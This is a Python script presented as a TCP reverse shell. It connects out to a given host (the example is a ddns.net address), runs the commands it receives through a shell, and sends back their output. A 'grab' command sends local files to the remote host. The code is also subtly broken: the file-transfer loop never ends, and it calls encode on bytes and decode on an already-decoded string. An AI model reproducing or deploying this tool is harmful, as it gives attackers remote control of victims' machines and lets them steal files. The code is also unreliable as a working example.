import socket
import subprocess
import sys
import argparse
import os


def parse_arguments():
    parser = argparse.ArgumentParser(
        description="TCP Reverse Shell", epilog="%(prog)s pythonhussam.ddns.net 8080"
    )
    parser.add_argument("host", type=str, help="Hostname like 'pythonhussam.ddns.net'")
    parser.add_argument("port", type=int, help="Port Number")
    return parser.parse_args()


def transfer(client, command):
    fileName = command.split(" ")[1]  # Assuming command is "grab <filename>"
    if os.path.exists(fileName):
        with open(fileName, "rb") as file:
            bits = file.read(1024)
            while True:
                client.send(bits.encode())
                bits = file.read(1024)
            print("{} sent successfully".format(fileName))
    else:
        client.send(fileName.encode() + b" Not Found")


def hostnameToIp(hostname):
    ip = socket.gethostbyname(hostname)
    return ip


def connect(ip, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
        try:
            client.connect((ip, port))
            while True:
                command = (client.recv(1024)).decode("utf-8")
                if command.lower().strip() == "exit":
                    client.close()
                    break
                elif command.strip().lower().startswith("grab"):
                    transfer(client, command)
                else:
                    process = subprocess.Popen(
                        command.decode("utf-8"),
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                    )
                    output, error = process.communicate()
                    if output:
                        client.send(output)
                    if error:
                        client.send(error)

        except socket.error:
            sys.stderr.write("Unable to connect to {}:{}".format(ip, port))


def main():
    args = parse_arguments()
    hostname = args.host
    port = args.port
    try:
        ip = hostnameToIp(hostname)
        connect(ip, port)
    except socket.gaierror:
        sys.stderr.write("Unable to resolve {}".format(hostname))


if __name__ == "__main__":
    main()
